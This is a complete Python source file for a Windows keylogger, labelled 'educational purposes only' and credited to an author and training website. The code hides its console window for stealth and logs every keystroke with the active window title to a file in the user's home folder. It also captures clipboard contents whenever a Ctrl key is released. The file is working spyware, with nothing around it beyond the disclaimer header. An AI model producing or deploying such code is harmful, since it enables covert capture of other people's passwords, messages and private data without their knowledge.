# EDUCATIONAL PURPOSES ONLY
# Created for ethical testing & awareness
# Author: Soham Tayade | www.tamizhanskills.com

from pynput.keyboard import Key, Listener
import logging
import os
import win32clipboard
import win32gui
import ctypes

# 🔒 Hide Console Window (Stealth Mode)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# 🗂️ Set log file path
log_dir = os.path.expanduser("~") + "/keylogs/"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = log_dir + "keylog.txt"

# 🧾 Setup Logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# 🪟 Track active window
current_window = ""

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

# 📋 Clipboard logger
def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "[Unable to read clipboard]"

# 🎹 On key press
def on_press(key):
    global current_window
    new_window = get_active_window()
    
    if new_window != current_window:
        current_window = new_window
        logging.info(f"\n\n[Window: {current_window}]\n")

    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        if key == Key.space:
            logging.info("Key Pressed: [SPACE]")
        elif key == Key.enter:
            logging.info("Key Pressed: [ENTER]")
        elif key == Key.tab:
            logging.info("Key Pressed: [TAB]")
        elif key == Key.backspace:
            logging.info("Key Pressed: [BACKSPACE]")
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            logging.info("Key Pressed: [CTRL]")
        elif key == Key.cmd:
            logging.info("Key Pressed: [CMD]")
        elif key == Key.esc:
            logging.info("Key Pressed: [ESC]")
        else:
            logging.info(f"Special Key Pressed: {key}")

# 🔁 On key release
def on_release(key):
    if key == Key.esc:
        # Stop listener on ESC key
        return False
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        # Check if clipboard paste (Ctrl+V)
        clipboard_data = get_clipboard()
        logging.info(f"[Clipboard Pasted Data]: {clipboard_data}")

# 🚀 Start Listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



